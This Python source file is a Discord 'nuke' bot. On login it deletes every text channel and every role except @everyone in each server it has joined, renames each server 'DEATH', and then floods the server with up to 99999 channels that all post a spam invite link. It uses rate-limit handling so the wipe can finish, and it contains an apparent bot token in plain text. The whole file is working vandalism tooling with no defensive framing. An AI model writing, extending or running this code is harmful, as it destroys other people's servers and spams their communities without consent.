import discord
from discord.ext import commands
import asyncio

# Configure intents
intents = discord.Intents.default()
intents.guilds = True  # Enable guilds intent
intents.messages = True  # Enable messages intent

# Create a bot instance
bot = commands.Bot(command_prefix="!", intents=intents)

async def delete_channel(channel):
    """Delete a channel and handle potential errors."""
    try:
        await channel.delete()
        print(f'Deleted channel: {channel.name} (ID: {channel.id})')
    except discord.HTTPException as e:
        if e.status == 429:  # Rate limit
            print(f'Rate limited while deleting {channel.name}. Waiting for {e.retry_after:.2f} seconds.')
            await asyncio.sleep(e.retry_after + 1)  # Wait until the limit resets
            await delete_channel(channel)  # Retry deletion
        elif e.status == 50013:  # Missing permissions
            print(f'Missing permissions to delete {channel.name}.')

async def create_channel(guild):
    """Create a single channel and handle potential errors."""
    channel_name = 'ggugooj0'
    try:
        channel = await guild.create_text_channel(channel_name)
        print(f'Created channel: {channel.name} (ID: {channel.id})')
        return channel  # Return the created channel for further use
    except discord.HTTPException as e:
        if e.status == 429:  # Rate limit
            print(f'Rate limited while creating {channel_name}. Waiting for {e.retry_after:.2f} seconds.')
            await asyncio.sleep(e.retry_after + 1)  # Wait until the limit resets
            return await create_channel(guild)  # Retry creation
        elif e.status == 50013:  # Missing permissions
            print(f'Missing permissions to create {channel_name}.')
            return None  # Return None if creation failed

async def send_embed_message(channel):
    """Send an embedded message to a channel."""
    embed = discord.Embed(
        title="Join Us!",
        description="Join our Discord server: [Click Here](https://discord.gg/S7wr39Hh)",
        color=0x00ff00
    )
    try:
        await channel.send(embed=embed)
        print(f'Sent message to {channel.name}')
    except discord.HTTPException as e:
        if e.status == 429:  # Rate limit
            print(f'Rate limited while sending message to {channel.name}. Waiting for {e.retry_after:.2f} seconds.')
            await asyncio.sleep(e.retry_after + 1)  # Wait until the limit resets
            await send_embed_message(channel)  # Retry sending the message

async def delete_all_channels(guild):
    """Delete all channels in a guild concurrently."""
    tasks = [delete_channel(channel) for channel in guild.channels if isinstance(channel, discord.TextChannel)]
    while tasks:
        # Limit the number of concurrent tasks to avoid rate limits
        chunk = tasks[:5]  # Adjust this number based on testing
        tasks = tasks[5:]
        await asyncio.gather(*chunk)  # Delete channels in chunks

async def create_channels(guild, num_channels):
    """Create multiple channels concurrently and send messages to each."""
    tasks = [create_channel(guild) for _ in range(num_channels)]
    
    # Limit the number of concurrent tasks to avoid rate limits
    created_channels = []
    while tasks:
        # Gather a limited number of tasks to avoid hitting rate limits
        chunk = tasks[:5]  # Adjust this number based on testing
        tasks = tasks[5:]
        created = await asyncio.gather(*chunk)
        created_channels.extend(filter(None, created))  # Add only non-None channels

    # Send embed messages to all created channels concurrently
    message_tasks = [send_embed_message(channel) for channel in created_channels]
    await asyncio.gather(*message_tasks)

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user} (ID: {bot.user.id})')
    print('------')

    for guild in bot.guilds:
        print(f'Processing guild: {guild.name} (ID: {guild.id})')

        # Delete all channels
        await delete_all_channels(guild)

        # Delete all roles except @everyone
        for role in guild.roles:
            if role.name != "@everyone":
                try:
                    await role.delete()
                    print(f'Deleted role: {role.name} (ID: {role.id})')
                except discord.HTTPException as e:
                    if e.status == 429:  # Rate limit
                        print(f'Rate limited while deleting role {role.name}. Waiting for {e.retry_after:.2f} seconds.')
                        await asyncio.sleep(e.retry_after + 1)  # Wait until the limit resets
                        await role.delete()  # Retry deletion

        # Change the server name to "DEATH"
        try:
            await guild.edit(name="DEATH")
            print(f'Server name changed to "DEATH"')
        except discord.HTTPException as e:
            print(f'Could not change server name: {e}')

        # Create 50 new channels called 'ggugooj0'
        await create_channels(guild, 99999)  # Create 50 channels concurrently

# --- Bot Token ---
bot.run('MTI5MTM5MTQ1Mzk1NTg4NzExOQ.GzNLHP.iHnV7SLg-fOTXwDZ2xVXSkgRrUPY9R7JVNcJSs')
